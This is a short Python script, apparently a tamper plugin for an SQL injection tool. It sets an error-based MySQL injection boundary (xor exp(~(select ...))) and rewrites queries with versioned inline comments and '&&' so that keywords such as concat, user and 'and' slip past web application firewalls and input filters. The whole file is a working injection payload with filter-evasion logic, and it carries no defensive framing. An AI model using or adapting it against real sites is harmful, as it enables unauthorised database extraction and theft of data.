#! /usr/bin/env python
# -*- coding:utf-8 -*-
# author:flystart
# home:www.flystart.org

b = " xor exp(~(/*!50000select*/*from(select(%query))a))"


def do(strings):
    if "concat" in strings:
        strings = strings.replace('concat(',"/*!concat*/(")
    if "user" in strings:
        strings = strings.replace('user(',"/*!user*/(")
    strings = strings.replace(' and ', "&&")
    return strings


def tamper(boundary,query):
    # print 'tamper'
    boundary = b
    query = do(query)
    return boundary,query